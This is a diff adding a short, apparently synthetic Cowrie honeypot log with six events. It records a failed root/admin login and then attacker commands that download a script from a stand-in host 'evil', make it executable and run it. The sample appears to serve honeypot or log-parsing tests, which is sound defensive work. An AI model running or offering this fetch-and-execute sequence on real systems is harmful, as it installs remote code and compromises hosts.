@@ -1,0 +1,6 @@
+{"eventid":"cowrie.login.failed","src_ip":"45.153.34.120","username":"root","password":"admin","timestamp":"2026-05-19T05:30:00Z"}
+{"eventid":"cowrie.command.input","src_ip":"45.153.34.120","input":"uname -a","timestamp":"2026-05-19T05:31:00Z"}
+{"eventid":"cowrie.command.input","src_ip":"45.153.34.120","input":"wget http://evil/bot.sh","timestamp":"2026-05-19T05:32:00Z"}
+{"eventid":"cowrie.command.input","src_ip":"45.153.34.120","input":"chmod +x bot.sh","timestamp":"2026-05-19T05:33:00Z"}
+{"eventid":"cowrie.command.input","src_ip":"45.153.34.120","input":"./bot.sh","timestamp":"2026-05-19T05:34:00Z"}
+{"eventid":"cowrie.session.file_download","src_ip":"45.153.34.120","url":"http://evil/bot.sh","shasum":"abc123","timestamp":"2026-05-19T05:35:00Z"}
